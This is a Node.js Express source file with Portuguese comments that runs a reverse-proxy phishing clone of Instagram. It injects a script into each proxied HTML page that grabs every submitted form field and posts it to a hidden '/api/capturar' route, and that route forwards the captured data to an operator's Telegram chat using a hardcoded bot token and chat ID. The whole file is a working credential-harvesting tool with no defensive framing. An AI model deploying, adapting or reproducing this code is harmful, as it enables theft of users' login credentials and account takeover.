const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cheerio = require('cheerio');

const app = express();
const PORT = process.env.PORT || 3000;

// Configurações
const TARGET_URL = 'https://www.instagram.com/'; // URL da página que quer clonar
const TELEGRAM_BOT_TOKEN = '8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs';
const TELEGRAM_CHAT_ID = '1004251154302';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rota invisível de captura
app.post('/api/capturar', async (req, res) => {
    const dados = req.body;
    
    let mensagem = "🚨 *Novos dados capturados!*\n\n";
    for (let [chave, valor] of Object.entries(dados)) {
        mensagem += `*${chave}*: ${valor}\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: mensagem,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error("Erro ao enviar mensagem:", e);
    }

    res.status(200).json({ status: 'ok' });
});

// Proxy Reverso
app.use('/', createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    selfHandleResponse: true,
    on: {
        onProxyRes: (proxyRes, req, res) => {
            let originalBody = [];
            proxyRes.on('data', (chunk) => originalBody.push(chunk));
            proxyRes.on('end', () => {
                let body = Buffer.concat(originalBody).toString('utf-8');

                if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
                    const $ = cheerio.load(body);
                    
                    const scriptInjetado = `
                        <script>
                            document.addEventListener('DOMContentLoaded', () => {
                                const forms = document.querySelectorAll('form');
                                forms.forEach(form => {
                                    form.addEventListener('submit', () => {
                                        const formData = new FormData(form);
                                        const dados = {};
                                        formData.forEach((v, k) => { dados[k] = v; });

                                        fetch('/api/capturar', {
                                            method: 'POST',
                                            headers: { 'Content-Type': 'application/json' },
                                            body: JSON.stringify(dados)
                                        }).catch(() => {});
                                    });
                                });
                            });
                        </script>
                    `;

                    $('body').append(scriptInjetado);
                    body = $.html();
                }

                res.writeHead(proxyRes.statusCode, proxyRes.headers);
                res.end(body);
            });
        }
    }
}));

app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));